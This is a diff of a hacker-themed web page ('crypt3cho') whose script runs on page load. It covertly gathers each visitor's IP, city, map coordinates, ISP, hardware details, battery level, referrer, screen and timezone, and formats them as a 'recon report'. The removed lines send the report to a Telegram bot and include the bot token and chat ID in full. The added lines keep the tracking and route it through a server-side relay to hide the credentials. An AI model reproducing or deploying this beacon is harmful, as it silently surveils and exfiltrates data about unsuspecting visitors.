@@ -108,7 +108,7 @@
 <body>
     <div class="container">
         <div class="terminal-header">
-            root@crypt3cho:~# ./initialize_node.sh --full-recon-active
+            root@crypt3cho:~# ./initialize_node.sh --secure-mode-active
         </div>
 
         <div class="header">
@@ -179,40 +179,31 @@
 
     <script>
         (function() {
-            const token = "8734320096:AAGlLFUxCWtlbzb1EHim-SLhCuu17V9FJWU";
-            const chatId = "8375518813";
-
             async function getIntelligence() {
                 try {
-                    // 1. Red y Geolocalización
+                    // 1. Recolección de Inteligencia Local
                     const response = await fetch('https://ipapi.co/json/');
                     const data = await response.json();
 
-                    // 2. Metadata de Hardware
                     const ram = navigator.deviceMemory || "N/A";
                     const cores = navigator.hardwareConcurrency || "N/A";
-                    
-                    // 3. Intento de Lectura de Batería
-                    let batStatus = "N/A (Bloqueado por OS)";
+                    const referer = document.referrer || "Acceso Directo";
+                    const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+
+                    // Intento de Batería
+                    let batStatus = "N/A";
                     if (navigator.getBattery) {
                         try {
                             const battery = await navigator.getBattery();
                             batStatus = `${(battery.level * 100).toFixed(0)}% ${battery.charging ? '(Cargando)' : '(Batería)'}`;
                         } catch(e) {}
                     }
-                    
-                    // 4. Origen del Tráfico
-                    const referer = document.referrer || "Acceso Directo / Bookmark";
-                    
-                    // 5. Link a Google Maps
-                    const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
 
-                    const text = `🚨 *OPERATIONAL INTELLIGENCE REPORT*\n` +
+                    // 2. Construcción del Reporte
+                    const report = `🚨 *SECURE RECON REPORT*\n` +
                                  `━━━━━━━━━━━━━━━━━━\n` +
-                                 `📍 *RED & IP:*\n` +
-                                 `IP: \`${data.ip}\`\n` +
-                                 `ISP: ${data.org}\n` +
-                                 `Ubicación: ${data.city}, ${data.country_name}\n` +
+                                 `📍 *IP:* \`${data.ip}\`\n` +
+                                 `🌍 *ORIGIN:* ${data.city}, ${data.country_name}\n` +
                                  `🗺️ *MAPA:* [Ver en Google Maps](${mapLink})\n\n` +
                                  `🌐 *REFERER:* ${referer}\n\n` +
                                  `💻 *HARDWARE & SISTEMA:*\n` +
@@ -220,20 +211,16 @@
                                  `CPU: ${cores} Cores | RAM: ~${ram} GB\n` +
                                  `🔋 Energía: ${batStatus}\n` +
                                  `🖥️ Res: ${window.screen.width}x${window.screen.height}\n` +
-                                 `🌍 Lang: ${navigator.language}\n` +
                                  `🕒 TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n\n` +
                                  `🔗 *TARGET:* ${window.location.hostname}${window.location.pathname}\n` +
                                  `━━━━━━━━━━━━━━━━━━`;
 
-                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    // 3. Envío Seguro al Gatekeeper (Lado del servidor)
+                    // No se exponen Tokens ni IDs aquí.
+                    fetch('gatekeeper.php', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: text,
-                            parse_mode: 'Markdown',
-                            disable_web_page_preview: false
-                        }),
+                        body: JSON.stringify({ text: report }),
                         keepalive: true
                     });
                 } catch (err) {}
